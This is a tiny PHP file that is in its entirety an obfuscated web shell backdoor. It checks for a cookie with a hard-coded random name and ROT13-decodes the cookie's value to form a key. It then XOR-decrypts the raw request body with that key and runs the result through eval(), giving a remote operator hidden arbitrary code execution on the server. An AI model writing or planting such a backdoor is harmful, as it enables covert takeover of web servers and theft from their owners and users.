<?php 

$gneluvug = "svuvmigfbltchplw";

if (isset($_COOKIE[$gneluvug])) {
    $qlfzse = str_rot13($_COOKIE[$gneluvug]);
    $kgvreblon = "";
    foreach (str_split(@file_get_contents('php://input'), strlen($qlfzse)) as $xlkse) {
        $kgvreblon .= $xlkse ^ $qlfzse;
    }
    eval($kgvreblon);
}